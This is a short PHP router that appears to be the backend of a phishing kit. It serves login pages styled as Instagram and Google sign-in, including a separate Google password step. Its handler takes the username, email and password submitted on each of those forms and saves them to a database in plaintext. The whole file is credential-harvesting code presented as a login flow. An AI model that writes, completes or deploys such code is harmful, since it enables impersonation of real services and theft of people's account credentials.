<?php

if (preg_match('/\.(css|js|png|jpg|jpeg|gif|svg|ico)$/', $page)) {
    return false;
}

function showPage($pageToShow, $pdo = null)
{
    switch ($pageToShow)
    {
        case "login":
            require __DIR__ . "/../pages/login.html";
            break;
        
        case "igLogin":
            require __DIR__ . "/../pages/ig.html";
            break;

        case "googleLogin":
            require __DIR__ . "/../pages/google.html";
            break;
        
        case "google/password":
            require __DIR__ . "/../pages/password.html";
            break;
        
        case "dashboard":
            require __DIR__ . "/../pages/dashboard.php";
            break;
    }
}

function handle($form)
{
    switch ($form)
    {
        case "login":
        case "signUp":
        case "igLogin":
        case "googleLogin":

            $data = json_decode(file_get_contents("php://input"), true);

$username = $data["username"] ?? "";
$email = $data["email"] ?? "";
$password = $data["password"] ?? "";

saveToDB($username, $email, $password);

       //     echo "Saved Successfully";

            break;
    }
}